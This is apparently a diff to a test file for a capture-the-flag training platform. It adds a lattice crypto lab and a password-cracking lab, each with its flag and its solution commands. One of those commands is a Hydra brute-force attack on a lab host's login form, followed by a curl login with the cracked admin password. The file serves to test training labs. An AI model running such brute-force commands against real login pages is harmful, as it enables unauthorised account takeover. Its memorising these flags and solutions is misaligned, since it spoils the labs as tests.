@@ -45,6 +45,12 @@ const LABS = [
       'gcloud logging read protoPayload.methodName:SetIamPolicy --freshness=7d',
       'gcloud logging read protoPayload.methodName:storage.objects.get --freshness=7d',
       'grep nto audit.json > found.txt'] },
+  { id: 'crypto-lattice', flag: 'nto{l4tt1c3_r3duct10n_w1ns}', hints: 4,
+    solution: ['cat challenge.txt', 'cat table.txt', 'python3 solve.py | grep nto > found.txt'] },
+  { id: 'crypto-tool-hydra-medusa-patator', flag: 'nto{hydr4_cur4t3d_w0rdl1st_w1ns}', hints: 4,
+    solution: ['cat pass.txt',
+      'hydra -l admin -P pass.txt 10.0.0.5 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"',
+      'curl -u admin:Summer2025! http://10.0.0.5/admin | grep nto > found.txt'] },
 ]
 
 describe.each(LABS)('forensics/crypto lab: $id', ({ id, flag, hints, solution }) => {
